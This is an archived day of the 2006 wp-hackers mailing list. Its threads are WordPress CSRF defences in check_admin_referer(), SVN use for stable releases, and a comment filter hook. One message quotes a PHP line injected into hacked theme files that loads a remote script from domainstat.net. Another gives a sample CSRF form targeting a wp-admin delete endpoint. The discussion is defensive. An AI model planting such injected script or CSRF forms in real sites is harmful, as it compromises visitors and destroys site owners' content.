This would also have the advantage of moving the AYS dialog call into the
actual deletion function.  The reason I was able to delete a post without
any notice to the admin is that they AYS prompt is totally independent of
the hyperlink that actually triggers the deletion.

From dmhouse at gmail.com  Wed Apr 19 15:14:43 2006
From: dmhouse at gmail.com (David House)
Date: Wed Apr 19 15:18:44 2006
Subject: [wp-hackers] Filter hook to selectively show comments for a post
In-Reply-To: <20060419145852.85402.qmail@web33611.mail.mud.yahoo.com>
References: <44453DA9.2030001@paul-mitchell.me.uk>
	<20060419145852.85402.qmail@web33611.mail.mud.yahoo.com>
Message-ID: <ebe43d680604190814t109fd31bwb275358534d6b1bd@mail.gmail.com>

On 19/04/06, Korey Atterberry <korey99@yahoo.com> wrote:
> Ok, thanks for the confirmation, Paul.  I'll try that approach.  I
> could probably get by asking my users to add just one line to their
> comment template.

Feel free to request a new filter for inclusion in the next version:
http://trac.wordpress.org/newticket

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From ckunte at gmail.com  Wed Apr 19 16:20:23 2006
From: ckunte at gmail.com (Chetan Kunte)
Date: Wed Apr 19 16:24:22 2006
Subject: [wp-hackers] Domainstat intrusion
Message-ID: <74b84aa30604190920y77be0a2ak42ba4f5ca059dd33@mail.gmail.com>

Hi all -

First of all, I am sorry to bring this up on this forum, but my theme
files are getting modified. The modified files have this following
script inserted (the ID seems to change from file to file but
essentially this is it).

<? if (!defined('domainstat')) { define("domainstat", "ok");  echo
"<script language='JavaScript' type='text/javascript'
src='http://domainstat.net/stat.php?id=f15d1bf'></script>";}?>

Tell me I've been hacked and I'll believe you. More than that I'd like
to know how anyone could modify these files without permission. I'm
not being sloppy with passwords.

Any help / insight into this would really be helpful, thanks in advance.
--
Chetan, ckunte.com
From chris.lott at gmail.com  Wed Apr 19 16:51:57 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Wed Apr 19 16:55:58 2006
Subject: [wp-hackers] WordPress, mod_userdir, ~, and uploads
Message-ID: <9b1b9dab0604190951y78b6f419r41edd9036b7e44bc@mail.gmail.com>

Does anyone have experience using WordPress with mod_userdir and blogs
installed in directories that have a ~ prefix (i.e.
http://www.foo.com/~user/blog/) ?

I have two separate new installations in this environment and both are
having problems with the file uploads/linking when posting--
specifically the files upload fine and initially look fine when placed
in the post, but the links are mangled when posted. Never seen this
behavior before... and I can't tell if it's a tinyMCE or WordPress
issue for that matter...

c
--
Chris Lott
From wp-hackers at paul-mitchell.me.uk  Wed Apr 19 17:06:52 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Wed Apr 19 17:11:51 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9806B@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF9806B@dsimail.drbsystems.com>
Message-ID: <44466E2C.90406@paul-mitchell.me.uk>

Brian Layman wrote:
> Mark Jaquith wrote:
>   
>> 3) if HTTP referer isn't from the admin, present "are you sure" dialog
>>     
> This would also have the advantage of moving the AYS dialog call into the
> actual deletion function.  The reason I was able to delete a post without
> any notice to the admin is that they AYS prompt is totally independent of
> the hyperlink that actually triggers the deletion.
>   
I would prefer that $_GET['action']=='deletepost' present the AYS form
that submits $_POST['action']=='deletepost' to do the dirty work, which
allows the client-side AYS JS to be discarded.

Paul

From wp-hackers at paul-mitchell.me.uk  Wed Apr 19 17:07:59 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Wed Apr 19 17:12:59 2006
Subject: [wp-hackers] Filter hook to selectively show comments for a post
In-Reply-To: <ebe43d680604190814t109fd31bwb275358534d6b1bd@mail.gmail.com>
References: <44453DA9.2030001@paul-mitchell.me.uk>	<20060419145852.85402.qmail@web33611.mail.mud.yahoo.com>
	<ebe43d680604190814t109fd31bwb275358534d6b1bd@mail.gmail.com>
Message-ID: <44466E6F.3050308@paul-mitchell.me.uk>

David House wrote:
> Feel free to request a new filter for inclusion in the next version:
> http://trac.wordpress.org/newticket
Thanks David. I didn't know how to say that!

Paul

From false.hopes at gmail.com  Wed Apr 19 17:28:38 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr 19 17:32:38 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444618F9.9070000@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
	<4445B0BB.7070602@mullenweg.com> <444618F9.9070000@metalab.unc.edu>
Message-ID: <a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>

On 4/19/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> Matt Mullenweg wrote:
>
> > If the best an attacker can do is embed a link in a comment or email and
> > hope you click on it, then we've succeeded. At some point we have to
> > stop punishing normal users for the extreme edge cases.
>
>
> No, If that's possible, you've made a classic mistake. Clicking the link
> should not take any action. That's the difference between GET and POST:
>
> http://cafe.elharo.com/web/rest-mistake-1-confirming-gets/
>
> It's easy to fix. You just need to make sure that all actions take place
> through POST, not GET, regardless of URL. This wouldn't punish anybody.

A link with embedded javascript in an e-mail will easily bypass this,
its not so easy to fix.

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Wed Apr 19 17:29:41 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr 19 17:33:42 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44461432.1090902@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
	<4445B0BB.7070602@mullenweg.com>
	<aa74b1910604182146k27c084eg798cd5619857abd9@mail.gmail.com>
	<4445C98B.9040902@mullenweg.com>
	<aa74b1910604190219t16ea6344gb47f43a7157650ed@mail.gmail.com>
	<44461432.1090902@metalab.unc.edu>
Message-ID: <a491f91d0604191029w4888db9dpb1b71ac81e3353e7@mail.gmail.com>

On 4/19/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> Sam Angove wrote:
>
> > Well, it's the same with doors and locks: the chance that someone will
> > exploit my unlocked door is infinitesimal.
>
> Only because no one's yet built a robot to quickly scan all doors in the
> neighborhood to see which are unlocked. The problem's quite a bit more
> serious for WordPress. :-(

A robot to scan your local WordPress neighborhood isn't quite so
possible either, because the particular vulnerability we're trying to
protect against has a certain prerequisite, you must somehow convince
a human to click a link or visit a page, infection isn't automated,
and so, as Matt said, this is an edge case.

--
--Robert Deaton
http://somethingunpredictable.com
From m at mullenweg.com  Wed Apr 19 17:31:38 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr 19 17:35:40 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44461432.1090902@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>	<aa74b1910604182146k27c084eg798cd5619857abd9@mail.gmail.com>	<4445C98B.9040902@mullenweg.com>	<aa74b1910604190219t16ea6344gb47f43a7157650ed@mail.gmail.com>
	<44461432.1090902@metalab.unc.edu>
Message-ID: <444673FA.70403@mullenweg.com>

Elliotte Harold wrote:
>> Well, it's the same with doors and locks: the chance that someone will
>> exploit my unlocked door is infinitesimal. 
> 
> Only because no one's yet built a robot to quickly scan all doors in the 
> neighborhood to see which are unlocked. The problem's quite a bit more 
> serious for WordPress. :-(

I have never heard of a worm exploiting a distributed application 
through CSRF. It would be pretty difficult, and likely die.

If a worm were created, its best attack vector would be through 
comments. We could blog about it to warn people, since it's mostly a 
social hack education would help the most, and they could also be 
blocked by Akismet. In the event of an emergency, we have plenty of ways 
to contact people: through blogs, through the dashboard, mailing lists, 
and the one-way announcement list.

Social hacks will always be the most successful. The most common false 
false postives on Akismet are the ones asking where the RSS feed is, or 
complimenting the webmaster on their design. Remember the Windows thing 
that would tell people if there was a certain file in their system32 
directory they had spyware/virus, and went over the 20 steps to find and 
remove it?

Anyway, we're off-topic.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From m at mullenweg.com  Wed Apr 19 17:34:10 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr 19 17:38:07 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>
	<444618F9.9070000@metalab.unc.edu>
	<a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>
Message-ID: <44467492.5050407@mullenweg.com>

Robert Deaton wrote:
>> It's easy to fix. You just need to make sure that all actions take place
>> through POST, not GET, regardless of URL. This wouldn't punish anybody.
> 
> A link with embedded javascript in an e-mail will easily bypass this,
> its not so easy to fix.

This has been brought up many times before.

<form method="post" action="http://example.com/wp-admin/delete-all.php">
   <input type="submit" name="Submit" value="Click Here" />
   for a free iPod!
</form>

That said, there are some places we're using GET gratuitously.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From elharo at metalab.unc.edu  Wed Apr 19 17:34:52 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Wed Apr 19 17:39:11 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>
	<444618F9.9070000@metalab.unc.edu>
	<a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>
Message-ID: <444674BC.1060800@metalab.unc.edu>

Robert Deaton wrote:

>> It's easy to fix. You just need to make sure that all actions take place
>> through POST, not GET, regardless of URL. This wouldn't punish anybody.
> 
> A link with embedded javascript in an e-mail will easily bypass this,
> its not so easy to fix.
> 

That's hard to believe. Are users (and more importantly e-mail vendors) 
really so clueless about web security and HTTP that this is possible?

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From chris.lott at gmail.com  Wed Apr 19 17:38:57 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Wed Apr 19 17:42:56 2006
Subject: [wp-hackers] Subversion for production servers
Message-ID: <9b1b9dab0604191038y32139a86r169bb9ad8c22de0f@mail.gmail.com>

Using subversion for development and to keep up with nightlies is
easy-- just keep up to date with the trunk.

but is there documented somewhere a way to use subversion to keep up
with stable releases?  I have nearly 20 WP blogs that can't be moved
into my WPMU farm. These are live, working sites so I don't really
want to run nightlies... but it would be nice to upgrade via SVN when
stable releases are out-- I imagine that this involves using 'svn
switch' but my knowledge of svn in this area is slim and the book
isn't making me confident because I know we are 2.0.2 right now but
when I browse the svn tree I Don't see any tag for 2.0.2, just 2.0.1
--

c
--
Chris Lott
From false.hopes at gmail.com  Wed Apr 19 17:42:33 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr 19 17:46:34 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444674BC.1060800@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
	<4445B0BB.7070602@mullenweg.com> <444618F9.9070000@metalab.unc.edu>
	<a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>
	<444674BC.1060800@metalab.unc.edu>
Message-ID: <a491f91d0604191042n501dfafeo68212074339043a9@mail.gmail.com>

On 4/19/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> Robert Deaton wrote:
>
> >> It's easy to fix. You just need to make sure that all actions take place
> >> through POST, not GET, regardless of URL. This wouldn't punish anybody.
> >
> > A link with embedded javascript in an e-mail will easily bypass this,
> > its not so easy to fix.
> >
>
> That's hard to believe. Are users (and more importantly e-mail vendors)
> really so clueless about web security and HTTP that this is possible?

Yes.

--
--Robert Deaton
http://somethingunpredictable.com
From elharo at metalab.unc.edu  Wed Apr 19 17:48:07 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Wed Apr 19 17:52:28 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44467492.5050407@mullenweg.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>	<444618F9.9070000@metalab.unc.edu>	<a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>
	<44467492.5050407@mullenweg.com>
Message-ID: <444677D7.509@metalab.unc.edu>

Matt Mullenweg wrote:

> This has been brought up many times before.
> 
> <form method="post" action="http://example.com/wp-admin/delete-all.php">
>   <input type="submit" name="Submit" value="Click Here" />
>   for a free iPod!
> </form>

Personally I'm a little more likely to notice a form in a comment than a 
plain link and wonder what's it doing there. Using an image submit 
button that contains a picture of text might disguise the link a little 
more effectively.

But is this even allowed? With the default options is it possible to put 
a form tag (or an img or script tag) in a comment?

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From chris.lott at gmail.com  Wed Apr 19 17:50:44 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Wed Apr 19 17:54:47 2006
Subject: [wp-hackers] Re: Subversion for production servers
In-Reply-To: <9b1b9dab0604191038y32139a86r169bb9ad8c22de0f@mail.gmail.com>
References: <9b1b9dab0604191038y32139a86r169bb9ad8c22de0f@mail.gmail.com>
Message-ID: <9b1b9dab0604191050y6e8e2ffeoeed3efb8958ed804@mail.gmail.com>

On 4/19/06, Chris Lott <chris.lott@gmail.com> wrote:
> Using subversion for development and to keep up with nightlies is
> easy-- just keep up to date with the trunk.

Sorry, that was convoluted. The simpler way to put this is:
how do I check out the latest 2.0.2 release vie svn since there is no
tag for it?

I figured out how to switch with svn (duh).

c
--
Chris Lott
From false.hopes at gmail.com  Wed Apr 19 17:53:22 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr 19 17:57:24 2006
Subject: [wp-hackers] Re: Subversion for production servers
In-Reply-To: <9b1b9dab0604191050y6e8e2ffeoeed3efb8958ed804@mail.gmail.com>
References: <9b1b9dab0604191038y32139a86r169bb9ad8c22de0f@mail.gmail.com>
	<9b1b9dab0604191050y6e8e2ffeoeed3efb8958ed804@mail.gmail.com>
Message-ID: <a491f91d0604191053g2e886835pcca2e6a30217fad@mail.gmail.com>

On 4/19/06, Chris Lott <chris.lott@gmail.com> wrote:
> On 4/19/06, Chris Lott <chris.lott@gmail.com> wrote:
> > Using subversion for development and to keep up with nightlies is
> > easy-- just keep up to date with the trunk.
>
> Sorry, that was convoluted. The simpler way to put this is:
> how do I check out the latest 2.0.2 release vie svn since there is no
> tag for it?

svn co http://svn.automattic.com/wordpress/branches/2.0/

--
--Robert Deaton
http://somethingunpredictable.com
From kaf at szub.net  Wed Apr 19 17:55:22 2006
From: kaf at szub.net (Kaf Oseo)
Date: Wed Apr 19 17:59:20 2006
Subject: [wp-hackers] Subversion for production servers
In-Reply-To: <9b1b9dab0604191038y32139a86r169bb9ad8c22de0f@mail.gmail.com>
References: <9b1b9dab0604191038y32139a86r169bb9ad8c22de0f@mail.gmail.com>
Message-ID: <4446798A.6080201@szub.net>

Isn't the current stable release available through the branch (though
admittedly there's at times a delay)?

Right now 2.0.2 is here:

http://svn.automattic.com/wordpress/branches/2.0/

Chris Lott wrote:
> Using subversion for development and to keep up with nightlies is
> easy-- just keep up to date with the trunk.
> 
> but is there documented somewhere a way to use subversion to keep up
> with stable releases?  I have nearly 20 WP blogs that can't be moved
> into my WPMU farm. These are live, working sites so I don't really
> want to run nightlies... but it would be nice to upgrade via SVN when
> stable releases are out-- I imagine that this involves using 'svn
> switch' but my knowledge of svn in this area is slim and the book
> isn't making me confident because I know we are 2.0.2 right now but
> when I browse the svn tree I Don't see any tag for 2.0.2, just 2.0.1

From m at mullenweg.com  Wed Apr 19 18:04:28 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr 19 18:08:31 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444677D7.509@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>	<444618F9.9070000@metalab.unc.edu>	<a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>	<44467492.5050407@mullenweg.com>
	<444677D7.509@metalab.unc.edu>
Message-ID: <44467BAC.5000008@mullenweg.com>

Elliotte Harold wrote:
> But is this even allowed? With the default options is it possible to put 
> a form tag (or an img or script tag) in a comment?

Of course not, but we're not talking about XSS, we're talking about CSRF.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From Brian at TheCodeCave.com  Wed Apr 19 18:27:30 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 19 18:31:38 2006
Subject: [wp-hackers] Domainstat intrusion
In-Reply-To: <74b84aa30604190920y77be0a2ak42ba4f5ca059dd33@mail.gmail.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9806D@dsimail.drbsystems.com>

Which version of WP are you using? Older versions had security issues the
newer ones have patched.

BTW, you're not alone in this by any means, even in the WP world.  Here are
just a few references:

http://www.google.com/search?num=100&hl=en&lr=&q=%22domainstat.net%22

There are a couple WP support forum references in there.

From elharo at metalab.unc.edu  Wed Apr 19 18:46:19 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Wed Apr 19 18:50:40 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44467BAC.5000008@mullenweg.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>	<444618F9.9070000@metalab.unc.edu>	<a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>	<44467492.5050407@mullenweg.com>	<444677D7.509@metalab.unc.edu>
	<44467BAC.5000008@mullenweg.com>
Message-ID: <4446857B.9040603@metalab.unc.edu>

Matt Mullenweg wrote:
> Elliotte Harold wrote:
>> But is this even allowed? With the default options is it possible to 
>> put a form tag (or an img or script tag) in a comment?
> 
> Of course not, but we're not talking about XSS, we're talking about CSRF.
> 


OK, so the problem is that someone puts a form/link/img on another site 
whose action indicates deleting an article on my site? The they have to 
get me to go there and click it somehow? Am I understanding this?

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From false.hopes at gmail.com  Wed Apr 19 18:50:18 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr 19 18:54:18 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4446857B.9040603@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
	<4445B0BB.7070602@mullenweg.com> <444618F9.9070000@metalab.unc.edu>
	<a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com>
	<44467492.5050407@mullenweg.com> <444677D7.509@metalab.unc.edu>
	<44467BAC.5000008@mullenweg.com> <4446857B.9040603@metalab.unc.edu>
Message-ID: <a491f91d0604191150o4dcb888bv28c76b2e493c9550@mail.gmail.com>

On 4/19/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> Matt Mullenweg wrote:
> > Elliotte Harold wrote:
> >> But is this even allowed? With the default options is it possible to
> >> put a form tag (or an img or script tag) in a comment?
> >
> > Of course not, but we're not talking about XSS, we're talking about CSRF.
> >
>
>
> OK, so the problem is that someone puts a form/link/img on another site
> whose action indicates deleting an article on my site? The they have to
> get me to go there and click it somehow? Am I understanding this?

Yes, and thus the "edge case" description.

--
--Robert Deaton
http://somethingunpredictable.com
From stewart at ugelow.com  Wed Apr 19 18:54:17 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Wed Apr 19 18:58:17 2006
Subject: [wp-hackers] Subversion for production servers
In-Reply-To: <9b1b9dab0604191038y32139a86r169bb9ad8c22de0f@mail.gmail.com>
References: <9b1b9dab0604191038y32139a86r169bb9ad8c22de0f@mail.gmail.com>
Message-ID: <7c94a5850604191154n2874042dp9289f955e4d3a368@mail.gmail.com>

> but is there documented somewhere a way to use subversion to keep up
> with stable releases?  I have nearly 20 WP blogs that can't be moved
> into my WPMU farm. These are live, working sites so I don't really
> want to run nightlies...

If you have 20 separate WP blogs, you might also want to check out
some of the updating techniques mentioned at
http://www.alexking.org/blog/2006/01/04/wordpress-updates-via-svn/

--Stewart

--

Stewart Ugelow
www.ugelow.com
From korey99 at yahoo.com  Wed Apr 19 19:10:22 2006
From: korey99 at yahoo.com (Korey Atterberry)
Date: Wed Apr 19 19:14:25 2006
Subject: [wp-hackers] Filter hook to selectively show comments for a post
In-Reply-To: <ebe43d680604190814t109fd31bwb275358534d6b1bd@mail.gmail.com>
Message-ID: <20060419191022.28341.qmail@web33601.mail.mud.yahoo.com>

Thanks, David and Paul.  I was looking for the enhancement request
system.  I'll submit that request.  I think it would be a handy
addition (at least for me!)

Korey

--- David House <dmhouse@gmail.com> wrote:

> On 19/04/06, Korey Atterberry <korey99@yahoo.com> wrote:
> > Ok, thanks for the confirmation, Paul.  I'll try that approach.  I
> > could probably get by asking my users to add just one line to their
> > comment template.
> 
> Feel free to request a new filter for inclusion in the next version:
> http://trac.wordpress.org/newticket
> 
> --
> -David House, dmhouse@gmail.com, http://xmouse.ithium.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

From elharo at metalab.unc.edu  Wed Apr 19 19:16:46 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Wed Apr 19 19:21:06 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000301c6636d$fdc0e4a0$0664a8c0@tiger1>
References: <000301c6636d$fdc0e4a0$0664a8c0@tiger1>
Message-ID: <44468C9E.6090302@metalab.unc.edu>

Brian Layman wrote:

>  With a WP 2.02 blog, I was able to delete posts without any
> indication to the administrator that it had happened. Using the same
> method, I was able to delete all tracks I'd left behind.  

This would be easier to understand if I could see the exploit (security 
by obscurity: 1 out of 2 ain't bad) but let's see if I get what you're 
doing:

1. You have a default install of WordPress 2.0.2. Call this FOO Blog.

2. You set up a form on another, unrelated site. Call this BAR site.

3. Someone logged into FOO blog as an administrator visits BAR site. 
They manually activate your form.

4. This silently deletes a post from FOO blog without the administrator 
being immediately aware that's what happened.

Is this correct? If not, what part of this scenario is incorrect?

Does step 3 use GET or POST?

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From davebytes at comcast.net  Wed Apr 19 19:21:35 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Apr 19 19:25:14 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net><4444AB62.8070807@paul-mitchell.me.uk><E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net><4445B0BB.7070602@mullenweg.com>
	<444618F9.9070000@metalab.unc.edu><a491f91d0604191028q502e96f7k32a3c1ba439a40e0@mail.gmail.com><44467492.5050407@mullenweg.com>
	<444677D7.509@metalab.unc.edu><44467BAC.5000008@mullenweg.com>
	<4446857B.9040603@metalab.unc.edu>
	<a491f91d0604191150o4dcb888bv28c76b2e493c9550@mail.gmail.com>
Message-ID: <00bb01c663e6$796dba60$6e01a8c0@sixfour>

Wow.  If that's the case I'd prefer to have an AYS prompt on any 
possibly-nasty GETs (or POSTs), every time.  Screw the referrer check. ;)

And, sorry to jump backwards in the conversation to another thread point, 
but I know someone mentioned the 'overhead' of actually writing temporary 
hash codes, Nonces, whatever into the DB (with a timestamp... I did this 
with a session-based custom PHP app, makes it a bit more secure, especially 
with the last-visited IP ;).)  But we're talking administration commands 
with effects here.  Just admins.  The overhead of reading/writing hashes, 
when/where needed (even if it's every action/submit), for administration 
should be negligible compared to the hits of hundreds, or thousands of users 
(or more) per day.  Right?

-d

----- Original Message ----- 
From: "Robert Deaton" <false.hopes@gmail.com>
To: <wp-hackers@lists.automattic.com>
Sent: Wednesday, April 19, 2006 2:50 PM
Subject: Re: [wp-hackers] Rethinking check_admin_referer()


| On 4/19/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
| > Matt Mullenweg wrote:
| > > Elliotte Harold wrote:
| > >> But is this even allowed? With the default options is it possible to
| > >> put a form tag (or an img or script tag) in a comment?
| > >
| > > Of course not, but we're not talking about XSS, we're talking about 
CSRF.
| > >
| >
| >
| > OK, so the problem is that someone puts a form/link/img on another site
| > whose action indicates deleting an article on my site? The they have to
| > get me to go there and click it somehow? Am I understanding this?
|
| Yes, and thus the "edge case" description.
|
| --
| --Robert Deaton
| http://somethingunpredictable.com
|


--------------------------------------------------------------------------------


| _______________________________________________
| wp-hackers mailing list
| wp-hackers@lists.automattic.com
| http://lists.automattic.com/mailman/listinfo/wp-hackers
| 

From false.hopes at gmail.com  Wed Apr 19 19:36:37 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr 19 19:40:39 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44468C9E.6090302@metalab.unc.edu>
References: <000301c6636d$fdc0e4a0$0664a8c0@tiger1>
	<44468C9E.6090302@metalab.unc.edu>
Message-ID: <a491f91d0604191236n5f1cfb62sefd2f915dd8147e4@mail.gmail.com>

On 4/19/06, Elliotte Harold <elharo@metalab.unc.edu> wrote:
> This would be easier to understand if I could see the exploit (security
> by obscurity: 1 out of 2 ain't bad) but let's see if I get what you're
> doing:
>
> 1. You have a default install of WordPress 2.0.2. Call this FOO Blog.
>
